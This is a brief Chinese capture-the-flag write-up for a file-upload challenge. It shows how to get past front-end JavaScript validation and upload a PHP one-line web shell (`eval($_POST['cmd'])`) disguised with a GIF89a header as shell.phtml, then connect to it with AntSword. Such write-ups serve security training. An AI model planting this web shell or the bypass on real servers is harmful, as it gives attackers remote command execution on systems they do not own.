# 分析

来自[[ACTF2020 新生赛]Upload](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Upload)，文件上传

先传一句话木马shell.phtml，发现前端有验证，禁用js再上传

```php
GIF89a
<?php @eval($_POST['cmd'])?>
```

![image-20240916192751077](image/image-20240916192751077.png)

使用蚁剑连接

![image-20240916192907242](image/image-20240916192907242.png)